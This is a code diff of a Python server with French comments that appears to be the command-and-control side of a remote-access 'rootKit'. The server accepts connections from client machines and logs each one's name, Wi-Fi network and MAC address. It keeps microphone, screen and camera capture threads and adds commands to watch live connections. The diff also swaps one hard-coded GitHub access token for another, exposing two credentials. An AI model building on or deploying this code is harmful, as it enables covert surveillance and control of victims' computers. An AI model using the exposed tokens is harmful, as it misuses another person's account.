@@ -20,7 +20,7 @@ def connected():
         return False
 if getSelfIp() not in("192.168.249.97") and connected():
     # First create a Github instance:
-    g = Github("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")
+    g = Github("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")
     # Then play with your Github objects:
     # for repo in g.get_user().get_repos():
     #     print(repo.name)
@@ -38,7 +38,7 @@ else:
     exit()
 
 githubUrl = "https://raw.githubusercontent.com/N0SAFE/kit-local/main/rootKit/"
-reset, sendAndReceive, mythreads, threadConnected = attr(0), [], [], []
+reset, sendAndReceive, mythreads, threadConnected, listenIp = attr(0), [], [], [], False
 
 class Microphone(threading.Thread):
     def __init__(self, ip, port):
@@ -86,13 +86,19 @@ class Microphone(threading.Thread):
         return self.RUN
 
 class myThread(threading.Thread):
-    def __init__(self,ip,port, ID, con, name): 
+    def __init__(self,ip,port, ID, con, init): 
         threading.Thread.__init__(self)
+        INIT = {}
+        for i in range(0, len(init), 2):
+            INIT[init[i]] = init[i+1]
+        print(INIT)
         self.micIsAlive = False
         self.screen = False
         self.camera = False
         self.linked = False
-        self.name = name
+        self.wifi = INIT['wifi']
+        self.name = INIT['name']
+        self.macAddress = INIT['mac']
         self.con = con
         self.ID = ID
         self.ip = ip 
@@ -264,7 +270,7 @@ class getConnected():
 
 # Programme du serveur TCP
 
-port, ipHost = 9999, requests.get(f"{githubUrl}ip").text.replace("\n", "")
+port, ipHost = 9999, getSelfIp()
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
 s.bind((ipHost, port))
@@ -282,17 +288,12 @@ def MainThread():
             # print("Serveur: en attente de connexions des clients TCP ...")
             (con, (ip,port)) = s.accept()
             OK = False
-            try:
-                name = con.recv(2048).decode()
-                OK = True
-            except:
-                pass
-            if OK:
-                mythread = myThread(ip, port, ID, con, name)
-                mythread.currentThread(mythread)
-                mythreads.append(mythread)
-                mythread.daemon = True
-                mythread.start()
+            init = con.recv(2048).decode()
+            mythread = myThread(ip, port, ID, con, init.split(':'))
+            mythread.currentThread(mythread)
+            mythreads.append(mythread)
+            mythread.daemon = True
+            mythread.start()
         except:
             pass
 
@@ -439,11 +440,21 @@ def retLineCmd(filename, numberline):
                 return("{}".format(line.strip()))
             line = fp.readline()
             cnt += 1
-            
+def printSocketCo():
+    mainThread = threading.currentThread()
+    # print(mainThread)
+    while getattr(mainThread, "do_run", True):
+        clear()
+        print('pour sortir appuyer sur entrer')
+        print()
+        print()
+        command('list')
+        sleep(5)
+
 def command(commandToExecute):
     commandToExecute = stopSpaceError(commandToExecute)
     commandToExecuteList = commandToExecute.split()
-    global ipToConnect, ip, run, reloading, progrun, affiche
+    global ipToConnect, ip, run, reloading, progrun, affiche, listenIp
     ip, error = [], False
     try:
         if commandToExecuteList[0] in ("connect", "connexion", "connecter", "co"):
@@ -481,6 +492,12 @@ def command(commandToExecute):
         elif commandToExecute in ("stop"):
             global progrun
             progrun = False
+        elif commandToExecute in ("listenIp", "listenip"):
+            t = threading.Thread(target=printSocketCo)
+            t.start()
+            input()
+            t.do_run = False
+            clear()
         elif commandToExecute in ("help", "aide"):
             help("command")
             command(inputcolor(preset=1))
@@ -500,6 +517,8 @@ def command(commandToExecute):
                 except Exception as e:
                     print(e)
                     pass
+        elif commandToExecute in ('setting', 'param', 'parameter'):
+            4
         elif commandToExecute in ("clear", "cleared", "cls", "restart"):
             print('cleared')
             restart()
@@ -508,8 +527,12 @@ def command(commandToExecute):
             os.system(os.path.basename(__file__))
             run, reloading, progrun=False, True, False
         elif commandToExecute in ("list"):
+            OK = False
             for thread in getAll.getCurrentThreads():
+                OK = True
                 print(f"{thread.getName()}  --->  {thread.getFullIp()}")
+            if not OK:
+                print('aucune connexion active...')
         # elif commandToExecute in ("command"):
         #     try:
         #         temp = run
